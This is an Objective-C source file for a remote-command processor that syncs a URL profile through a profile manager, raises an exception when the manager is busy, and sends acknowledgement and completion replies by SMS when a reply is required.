//
//  SyncUrlProfileProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/13/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SyncUrlProfileProcessor.h"
#import "UrlProfileManager.h"


@interface SyncUrlProfileProcessor (private)
- (void) processSyncUrlProfile;
- (void) syncUrlProfileException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation SyncUrlProfileProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the SyncUrlProfileProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@"SyncUrlProfileProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the SyncUrlProfileProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"SyncUrlProfileProcessor ---> doProcessingCommand")
	[self processSyncUrlProfile];
}


#pragma mark Private method

/**
 - Method name:			processSyncApplicationProfile
 - Purpose:				This method is used to process Sync Url Profile
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processSyncUrlProfile {
	DLog (@"SyncUrlProfileProcessor ---> processSyncUrlProfile")
	
	id <UrlProfileManager> urlProfileManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mUrlProfileManager];
	BOOL isReady = [urlProfileManager syncUrlProfile:self];
	if (!isReady) {
		DLog (@"!!! not ready to process sync url profile command")
		[self syncUrlProfileException];
	}
	else {
		DLog (@".... processing syn url profile command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			syncUrlProfileException
 - Purpose:				This method is invoked when it fails to get url profile
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) syncUrlProfileException {
	DLog (@"SyncUrlProfileProcessor ---> syncUrlProfileException");
	FxException* exception = [FxException exceptionWithName:@"syncUrlProfileException" andReason:@"Sync Url Profile error"];
	//[exception setErrorCode:kUrlProfileManagerBusy];
	[exception setErrorCode:kCmdExceptionErrorCmdBeingRetried];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncUrlProfileSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncApplicationProfileProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when sync application profile process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"SyncUrlProfileProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol UrlProfileDelegate
- (void) syncUrlProfileDidFinished: (NSError *) aError {
	DLog (@"!!!!!!! SyncUrlProfileProcessor ---> syncUrlProfileDidFinished")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *syncUrlProfileMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncUrlProfileSucessMSG2", @"")];		
		[self sendReplySMS:syncUrlProfileMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}


@end
